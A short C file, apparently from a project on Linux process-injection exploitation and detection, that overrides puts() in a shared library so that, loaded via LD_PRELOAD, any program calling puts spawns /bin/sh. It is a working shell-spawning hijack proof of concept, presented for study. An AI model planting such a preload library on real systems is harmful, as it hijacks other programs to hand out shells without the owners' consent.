/*
* Project: Process Injection Exploitation and Prevention / Detection Techniques in Linux
* Summary: Exploitation using LD_PRELOAD Environment Variable:
* Program to ovveride the implementation of puts. This program will be compiled into a shared library.
* This shared library's path will be assigned to the LD_PRELOAD environment variable.
* During the execution of any program, this shared library is loaded.
* Methods in the shared library take precedence over methods in the executing program.
* If the executing program uses put, the implementation in the shared library will take precedence over the one in the executing program.
*/

#include <unistd.h>
#include <stdio.h>

int puts(const char *data)
{
    char *shellCode[] = {"/bin/sh", 0};
    execv(shellCode[0], &shellCode[0]);
    return 0;
}
